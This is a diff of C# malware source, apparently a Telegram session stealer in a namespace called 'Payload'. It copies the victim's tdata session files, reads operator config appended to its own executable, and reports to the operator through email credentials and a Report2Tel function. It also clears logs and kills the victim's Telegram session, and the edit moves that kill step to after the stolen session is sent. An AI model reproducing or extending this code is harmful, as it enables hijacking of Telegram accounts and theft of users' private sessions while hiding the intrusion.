@@ -23,6 +23,7 @@ namespace Payload
         private static string RecieverEmail;
         private static string SenderEmailPassword;
         private static string TGVersion;
+        private static string TDLocation;
         #endregion
 
         #region Main
@@ -73,7 +74,7 @@ namespace Payload
 
             EXPL0IT();
 
-            #region FinalOperations
+            #region SendSession
             Thread.Sleep(1000);
             if (File.Exists(Session))
             {
@@ -83,6 +84,9 @@ namespace Payload
             ClearLogs();
             Application.Exit();
             #endregion
+
+            KillCurrentSession(TDLocation);
+
         }
         #endregion
 
@@ -97,6 +101,7 @@ namespace Payload
             {
                 try
                 {
+                    //byte[] Stub = File.ReadAllBytes(@"C:\Users\amirreza\Desktop\123.exe");
                     byte[] Stub = File.ReadAllBytes(Application.ExecutablePath.ToString());
                     byte[] ConfigArry = new byte[1024];
                     Array.ConstrainedCopy(Stub, Stub.Length - 1024, ConfigArry, 0, 1024);
@@ -296,7 +301,7 @@ namespace Payload
                 {
                     File.Copy(Map[1], Temp + @"\TelegramSession\" + @"tdata\" + SuperDirectory + @"\" + "map1");
                 }
-                KillCurrentSession(TDataLocation);
+                TDLocation = TDataLocation;
             }
             #endregion
 
@@ -465,6 +470,7 @@ namespace Payload
             else
             {
                 Report2Tel("Tdata not exists, User is using Custom Location 🙃");
+
                 #region Wait For Proccess
                 Report2Tel("Waiting for telegram proccess to track tdata location... 😎");
                 string SessionLocation = TryHookProccess();
